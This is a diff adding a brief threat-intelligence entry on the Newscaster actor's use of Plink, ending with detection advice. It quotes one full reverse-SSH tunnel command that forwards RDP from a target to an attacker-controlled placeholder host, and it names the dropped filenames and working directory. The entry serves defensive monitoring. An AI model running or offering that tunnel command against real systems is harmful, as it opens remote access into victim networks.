@@ -1,0 +1,10 @@
+PLINK
+
+Newscaster frequently uses Plink to create reverse-SSH tunnels through which they tunnel RDP connections into victim networks from attacker-controlled hosts on the internet. An example plink command used by Newscaster for this purpose is captured below (x.x.x.x = attacker controlled host, y.y.y.y = target host): p.exe -l test -pw 1234qwerASDF -batch -C -R y.y.y.y:3380:y.y.y.y:3389 x.x.x.x -P 443 -auto_store_key_in_cache -no_in
+
+
+Newscaster has often delivered Plink to internet-facing victim servers alongside webshells used to maintain server access. This utility has been delivered with the filenames plink.exe
+and p.exe, and has been specifically dropped to C:\temp\ (a working directory commonly used by Newscaster).
+
+
+Recommendation: Monitor for and alert on processes executing with common PLINK arguments, including those seen in the above PLINK command.
